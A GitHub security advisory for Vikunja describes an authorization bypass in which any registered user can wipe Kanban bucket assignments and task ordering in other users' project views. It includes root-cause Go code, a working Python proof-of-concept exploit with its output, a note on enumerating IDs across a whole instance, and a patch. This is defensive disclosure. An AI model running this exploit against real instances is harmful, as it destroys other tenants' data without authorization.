# [H] Vikunja vulnerable to Improper Authorization and Authorization Bypass Through User-Controlled Key

## Summary
Severity: High
Advisory: GHSA-gg93-x632-9ccv
CVE: CVE-2026-55065
CWE: CWE-285, CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-gg93-x632-9ccv
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0.24.6 <2.4.0

## Details
### Summary

A user with only a single self-owned project can permanently destroy the Kanban bucket assignments (`task_buckets`) and task ordering (`task_positions`) of **any other project view in the entire instance**. The `ProjectView.Delete` model method runs three SQL statements: the first is properly scoped to `(view_id, project_id)`, but the next two cascading deletes on `task_buckets` and `task_positions` filter only on the URL-supplied `project_view_id`. The permission check (`CanDelete`) gates on Admin of the URL `:project` but never confirms that the URL `:view` actually belongs to that project.

### Details

`ProjectView.Delete` (file: `pkg/models/project_view.go`, line 250) cascades on the bare `pv.ID` for the second and third deletes, ignoring `pv.ProjectID`:

```go
func (pv *ProjectView) Delete(s *xorm.Session, _ web.Auth) (err error) {
    _, err = s.
        Where("id = ? AND project_id = ?", pv.ID, pv.ProjectID).   // (a) scoped — OK
        Delete(&ProjectView{})
    if err != nil {
        return
    }

    _, err = s.Where("project_view_id = ?", pv.ID).Delete(&TaskBucket{})    // (b) UNSCOPED
    if err != nil {
        return
    }

    _, err = s.Where("project_view_id = ?", pv.ID).Delete(&TaskPosition{})  // (c) UNSCOPED
    return
}
```

`pv.ID` and `pv.ProjectID` come straight from the URL path via `c.Bind` — see the param tags on the struct (`pkg/models/project_view.go`, lines 133–137):

```go
type ProjectView struct {
    ID        int64 `xorm:"autoincr not null unique pk" json:"id" param:"view"`
    ...
    ProjectID int64 `xorm:"not null index" json:"project_id" param:"project"`
    ...
}
```

The route is registered with both params in `pkg/routes/routes.go`, line 791:

```go
a.DELETE("/projects/:project/views/:view", projectViewProvider.DeleteWeb)
```

`CanDelete` (file: `pkg/models/project_view_permissions.go`, line 38) gates only on Admin of the URL `:project`:

```go
func (pv *ProjectView) CanDelete(s *xorm.Session, a web.Auth) (bool, error) {
    if isInstanceAdmin(s, a) {
        return true, nil
    }
    filterID := GetSavedFilterIDFromProjectID(pv.ProjectID)
    if filterID > 0 { ... }

    pp := pv.getProject()              // = &Project{ID: pv.ProjectID}  (URL path)
    return pp.IsAdmin(s, a)            // only checks admin on URL :project
}
```

There is **no check** that the view (`pv.ID`) actually belongs to that project. The first SQL inside `Delete` (the `WHERE id = ? AND project_id = ?` clause) compensates *for the `project_views` table only*. xorm silently returns 0 affected rows on a mismatch — no error — and the function continues. The next two statements then run unconditionally on `pv.ID` alone.

Why other neighbouring code paths are not vulnerable, for context:

- `Bucket.canDoBucket` (`pkg/models/kanban_permissions.go`, line 46) loads the bucket from the DB and re-couples the URL project via `GetProjectViewByIDAndProject(viewID, projectID)`, which `WHERE id = ? AND project_id = ?` — mismatched URL `:project` returns an error. Safe.
- `ProjectView.Update` (`pkg/models/project_view.go`, line 412) calls the same `GetProjectViewByIDAndProject` *before* applying the update. Safe.
- `Project.UpdateProject` cascades use `s.In("project_view_id", viewIDs).Delete(&Bucket{})` (`pkg/models/project.go`, line 1396) where `viewIDs` is loaded from the DB inside an authorised project-delete context. Safe.

The same shape (load-by-URL-id, then cascade-without-coupling) was the root cause of GHSA-jfmm-mjcp-8wq2 (attachment IDOR) and GHSA-2vq4-854f-5c72 (project reparenting). The view-delete cascade has not been audited the same way.

### PoC

#### Prerequisites

- An authenticated account on the target Vikunja instance. **No special role is required** — local-auth registration is enough; the attacker becomes Admin of any project they create via the `OwnerID` field set in `CreateProject` (`pkg/models/project.go`, line 1021).
- Knowledge of any victim view ID. View IDs are auto-increment integers (`autoincr` on the `id` column), so guessing or sequential enumeration suffices. If the attacker is a member of any other project, they can list view IDs via `GET /api/v1/projects/:project/views`.

#### Attack Steps

```
# As the attacker, with valid JWT:
PUT /api/v1/projects                     -> create throwaway project (ID = P_A)
DELETE /api/v1/projects/P_A/views/V      -> V is ANY view ID in the instance
```

The server returns **HTTP 200** `{"message":"Successfully deleted."}` even when `V` is not in `P_A`. The first scoped delete matches 0 rows silently; the second and third unscoped deletes wipe `task_buckets` and `task_positions` for view `V`.

The view itself is not deleted. Tasks themselves are not deleted. But the Kanban layout (which task is in which column) and the manual ordering are destroyed and there is no recovery path short of restoring from backup.

#### Proof of Concept Script

```python
#!/usr/bin/env python3
"""
PoC: Cross-project destruction of task_buckets / task_positions via ProjectView.Delete
Target: Vikunja
Severity: HIGH - CVSS 8.1
CWE-639: Authorization Bypass Through User-Controlled Key

Usage:
    python3 poc.py http://localhost:3456
"""

import requests
import sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <BASE_URL>")
    print(f"Example: {sys.argv[0]} http://localhost:3456")
    sys.exit(1)

BASE = sys.argv[1].rstrip("/")
API = f"{BASE}/api/v1"

VICTIM_USER = "victim_poc"
VICTIM_PASS = "VictimPocPassword!2025"
ATTACKER_USER = "attacker_poc"
ATTACKER_PASS = "AttackerPocPassword!2025"

BANNER = """
=====================================================================
  PoC: Cross-Project Kanban Destruction via ProjectView.Delete
  Severity: HIGH (CVSS 8.1)
  CWE-639: Authorization Bypass Through User-Controlled Key
=====================================================================
"""
print(BANNER)


# ---- Helpers ----

def register(username, password):
    requests.post(f"{API}/register", json={
        "username": username,
        "email":    f"{username}@poc.local",
        "password": password,
    })  # ignore 400 if user already exists

def login(username, password):
    r = requests.post(f"{API}/login", json={
        "username": username, "password": password,
    })
    r.raise_for_status()
    return r.json()["token"]

def auth(token):
    return {"Authorization": f"Bearer {token}",
            "Content-Type":  "application/json"}


# ---- Victim setup: project + kanban view + tasks + bucket assignments ----

print("[*] Setting up VICTIM (target)")
register(VICTIM_USER, VICTIM_PASS)
vt = login(VICTIM_USER, VICTIM_PASS)

# Create a project (kanban view + default buckets are created automatically).
proj = requests.put(f"{API}/projects",
                    headers=auth(vt),
                    json={"title": "Victim Project"}).json()
victim_pid = proj["id"]

# Find the auto-created kanban view.
views = requests.get(f"{API}/projects/{victim_pid}/views",
                     headers=auth(vt)).json()
kanban_view = next(v for v in views if v["view_kind"] == "kanban")
victim_vid  = kanban_view["id"]

# Drop a few tasks into the project — Vikunja will auto-place them in the
# default bucket of the kanban view, populating `task_buckets`.
task_ids = []
for i in range(3):
    t = requests.put(f"{API}/projects/{victim_pid}/tasks",
                     headers=auth(vt),
                     json={"title": f"Victim task {i}"}).json()
    task_ids.append(t["id"])

# Touching the view via the bucket endpoint forces task_position rows to
# materialise. Read the buckets-with-tasks endpoint once.
requests.get(
    f"{API}/projects/{victim_pid}/views/{victim_vid}/buckets",
    headers=auth(vt),
)

# Confirm the kanban state has populated buckets+tasks.
buckets = requests.get(
    f"{API}/projects/{victim_pid}/views/{victim_vid}/buckets",
    headers=auth(vt),
).json()
total_tasks_before = sum(len(b.get("tasks") or []) for b in buckets)
print(f"[*] Victim project={victim_pid}, view={victim_vid}, "
      f"tasks_in_buckets BEFORE = {total_tasks_before}")
assert total_tasks_before > 0, "PoC requires at least 1 task in the kanban"


# ---- Attacker setup: a throwaway project owned by the attacker ----

print("\n[*] Setting up ATTACKER (any user can do this)")
register(ATTACKER_USER, ATTACKER_PASS)
at = login(ATTACKER_USER, ATTACKER_PASS)

p_a = requests.put(f"{API}/projects",
                   headers=auth(at),
                   json={"title": "Attacker Throwaway"}).json()
attacker_pid = p_a["id"]
print(f"[*] Attacker project = {attacker_pid} "
      f"(attacker is Admin via OwnerID)")


# ---- ATTACK ----

print(f"\n{'='*65}")
print(f"  ATTACK: trainer-equivalent — wipe victim's kanban via own project")
print(f"{'='*65}")

resp = requests.delete(
    f"{API}/projects/{attacker_pid}/views/{victim_vid}",
    headers=auth(at),
)
print(f"\n  DELETE /api/v1/projects/{attacker_pid}/views/{victim_vid}")
print(f"  (Logged in as: {ATTACKER_USER}, "
      f"who is NOT a member of victim project {victim_pid})")
print(f"  Response: HTTP {resp.status_code}  body={resp.text!r}")


# ---- VERIFY ----

print(f"\n{'='*65}")
print(f"  VERIFICATION")
print(f"{'='*65}")

# View must still exist (the scoped first delete didn't match).
views_after = requests.get(f"{API}/projects/{victim_pid}/views",
                           headers=auth(vt)).json()
view_still_there = any(v["id"] == victim_vid for v in views_after)

# But the buckets-with-tasks should now be empty (task_buckets wiped).
buckets_after = requests.get(
    f"{API}/projects/{victim_pid}/views/{victim_vid}/buckets",
    headers=auth(vt),
).json()
total_tasks_after = sum(len(b.get("tasks") or []) for b in buckets_after)

print(f"\n  View {victim_vid} still exists?           {view_still_there}")
print(f"  Tasks in buckets BEFORE attack:           {total_tasks_before}")
print(f"  Tasks in buckets AFTER attack:            {total_tasks_after}")

if view_still_there and total_tasks_after == 0 and total_tasks_before > 0:
    print("""
  +-----------------------------------------------------------------+
  |  VULNERABILITY CONFIRMED                                        |
  |                                                                 |
  |  An unrelated user destroyed every task->bucket assignment      |
  |  and every task position in another user's kanban view, using   |
  |  only a self-owned throwaway project as the URL :project.       |
  |                                                                 |
  |  - The view itself survives (first scoped delete matched 0).    |
  |  - Tasks themselves survive.                                    |
  |  - task_buckets and task_positions for the view are gone.       |
  |  - Recovery requires restoring from backup.                     |
  +-----------------------------------------------------------------+
""")
else:
    print("\n  Attack did not land — patched build or unexpected state.")
```

#### Proof of Concept Output

```
=====================================================================
  PoC: Cross-Project Kanban Destruction via ProjectView.Delete
  Severity: HIGH (CVSS 8.1)
  CWE-639: Authorization Bypass Through User-Controlled Key
=====================================================================

[*] Setting up VICTIM (target)
[*] Victim project=42, view=87, tasks_in_buckets BEFORE = 3

[*] Setting up ATTACKER (any user can do this)
[*] Attacker project = 43 (attacker is Admin via OwnerID)

=================================================================
  ATTACK: trainer-equivalent — wipe victim's kanban via own project
=================================================================

  DELETE /api/v1/projects/43/views/87
  (Logged in as: attacker_poc, who is NOT a member of victim project 42)
  Response: HTTP 200  body='{"message":"Successfully deleted."}'

=================================================================
  VERIFICATION
=================================================================

  View 87 still exists?           True
  Tasks in buckets BEFORE attack:           3
  Tasks in buckets AFTER attack:            0

  +-----------------------------------------------------------------+
  |  VULNERABILITY CONFIRMED                                        |
  |                                                                 |
  |  An unrelated user destroyed every task->bucket assignment      |
  |  and every task position in another user's kanban view, using   |
  |  only a self-owned throwaway project as the URL :project.       |
  |                                                                 |
  |  - The view itself survives (first scoped delete matched 0).    |
  |  - Tasks themselves survive.                                    |
  |  - task_buckets and task_positions for the view are gone.       |
  |  - Recovery requires restoring from backup.                     |
  +-----------------------------------------------------------------+
```

### Impact

1. **Cross-tenant data destruction.** Any authenticated user — local-auth registration is enough on default deployments — can wipe the `task_buckets` and `task_positions` rows for any view in the instance. There is no requirement to be a member of, or share anything with, the victim project.

2. **Permanent loss without backup.** Tasks and views survive, but every Kanban-column assignment and every manual ordering position for the targeted view is destroyed. Vikunja has no per-row recovery path; the only way back is restoring the database (or `task_buckets` / `task_positions` tables) from backup.

3. **Trivial discovery.** View IDs are auto-increment integers. An attacker can wipe every view in the instance by iterating `1..N`, calling `DELETE /api/v1/projects/<own-project>/views/<i>` for each. Each request is a 200 OK regardless of whether the view existed in the attacker's project — so the attacker can't even tell which IDs were "real" without watching for victim complaints.

4. **Multi-tenant SaaS impact.** On hosted Vikunja deployments (e.g. `try.vikunja.io`-style setups), a single sign-up suffices to destroy Kanban layouts of every other tenant on the same instance.

### Fix

Either gate the cascading deletes on whether the scoped first delete matched, or re-couple `(view_id, project_id)` inside the cascading queries.

Minimal patch — `pkg/models/project_view.go`, inside `Delete()`:

```go
func (pv *ProjectView) Delete(s *xorm.Session, _ web.Auth) (err error) {
    affected, err := s.
        Where("id = ? AND project_id = ?", pv.ID, pv.ProjectID).
        Delete(&ProjectView{})
    if err != nil {
        return
    }
    if affected == 0 {
        // Either the view doesn't exist, or it doesn't belong to pv.ProjectID.
        // Either way, do not cascade — return an error so the API responds 404.
        return ErrProjectViewDoesNotExist{ProjectViewID: pv.ID}
    }

    if _, err = s.Where("project_view_id = ?", pv.ID).Delete(&TaskBucket{}); err != nil {
        return
    }
    _, err = s.Where("project_view_id = ?", pv.ID).Delete(&TaskPosition{})
    return
}
```

This makes the cascade conditional on the scoped delete actually having matched a row. As a defence-in-depth follow-up, `CanDelete` should also load the view and verify `view.ProjectID == pv.ProjectID` before granting permission, so the 404 path in `Delete` becomes a backstop rather than the only line of defence — mirroring the pattern used by `Bucket.canDoBucket` and `ProjectView.Update` elsewhere in the same file.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-gg93-x632-9ccv
- https://github.com/go-vikunja/vikunja/pull/3239
- https://github.com/go-vikunja/vikunja/commit/6895a7765ef1667be4b79df29549d33b9e1ca9ca
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.4.0
